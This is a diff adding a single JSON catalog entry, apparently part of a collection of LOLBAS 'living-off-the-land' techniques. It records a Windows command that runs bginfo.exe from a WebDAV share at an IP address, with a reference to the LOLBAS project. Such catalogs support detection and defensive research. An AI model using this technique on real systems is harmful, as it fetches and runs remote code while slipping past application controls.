@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-bginfo-exe-execute-2",
+  "name": "LOLBAS · Bginfo.exe (Execute) #2",
+  "command": "\\\\10.10.10.10\\webdav\\bginfo.exe {PATH:.bgi} /popup /nolicprompt",
+  "description": "Execute bginfo.exe from a WebDAV server.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "bginfo",
+    "execute"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Bginfo/",
+  "upstream_id": "Bginfo.exe/Execute/1",
+  "category": "lolbas",
+  "subcategory": "execute",
+  "references": [
+    {
+      "title": "LOLBAS — Bginfo.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Bginfo/"
+    }
+  ]
+}
